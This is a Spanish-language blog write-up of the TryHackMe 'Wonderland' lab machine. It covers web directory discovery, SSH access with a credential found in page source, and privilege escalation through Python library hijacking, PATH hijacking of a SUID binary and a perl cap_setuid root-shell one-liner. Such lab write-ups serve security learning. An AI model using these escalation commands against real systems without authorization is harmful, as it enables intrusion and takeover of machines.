---
layout: single
title: Wonderland - TryHackMe
excerpt: " This was an easy Linux machine that involved performing content discovery against a web application to identify the SSH password of a user to obtain initial access and exploit various vulnerable Linux binary to escalate privileges to root. "
date: 2022-10-25
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-wonderland/wonderland.jpeg
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - python
  - path
  - hijacking
  - suid
  - capabilities
---

This was an easy Linux machine that involved performing content discovery against a web application to identify the SSH password of a user to obtain initial access and exploit various vulnerable Linux binary to escalate privileges to root.

# Summary
- IP: 10.129.135.230
- Ports: 22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Golang net/http server

# Recon
- Reconocimiento básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` bash
$sudo nmap -p22,80 -sCV 10.10.116.216 -oN targeted
``` 

- Análisis de directorios web con gobuster:

```bash
$gobuster dir -u 10.10.152.138 -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 200
```

- Encontramos el directorio "/r" entramos y volvermos a buscar directorios con gobuster:

```bash
$gobuster dir -u 10.10.152.138/r -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 200
```

- Encontramos el directorio "/r/a", así buscamos directorios hasta llegar a "/r/a/b/b/i/t" y aquí, analizando el código fuente podemos encontrar una credencial para el usuario "alice", accedemos por SSH:

- Vemos permisos de sudoers, nos arroja lo siguiente "(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py" es decir, podemos ejecutar dicha script como el usuario "rabbit".

- Analizamos la script en python encontrada, nos damos cuenta que no podemos modificarlo; analizando el código vemos que importa la librería "random", esto podemos aprovecharlo creando un archivo "random.py" en el directorio actual el cual contenga el código para ejecutar una bash como el usuario propietario de la script:

```bash
nano random

import os
os.system("/bin/bash")
```

- Ahora ejecutamos la script como el usuario "rabbit" y pivotamos de usuario:

```bash
$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

- Analizamos el directorio "/home/rabbit" y nos encontramos un binario de linux x64, lo analizamos con strings (si es necesario descargarlo en la máquina atacante para poder analizarlo):

```bash
strings teaParty
```

- En una parte del binario vemos lo siguiente:

```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

- Es decir, está llamando a "date" usando ruta relativa, a diferencia de "echo" en la cual si está utilizando la ruta absoluta, esto podemos explotarlo con PATH Hijacking:

```bash
touch /tmp/date
chmod +x /tmp/date
nano /tmp/date
```

```
#!/bin/bash
/bin/bash

```

```bash
export PATH=/tmp:$PATH
```

- (El binario tiene permisos SUID, sin embargo analizando los permisos vemos que como "rabbit" solo podemos ejecutarlo).

- Ahora ejecutamos el binario y se desplegará una bash como el usuario "hatter".

- En el directorio "/home/hatter" encontramos un password, lo usamos para entrar por SSH como el usuario "hatter" para tener una bash completamente funcional:

- Buscamos capabilities y encontramos el siguiente binario:

```bash
/usr/bin/perl = cap_setuid+ep
```

- Hacemos una búsqueda en gtfobins y encontramos el siguiente comando para poder escalar privilegios aprovechando las capabilities del binario "perl":

```bash
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

- Ejecutamos el comando y accedemos como root, vemos las flags tanto como de user y de root.
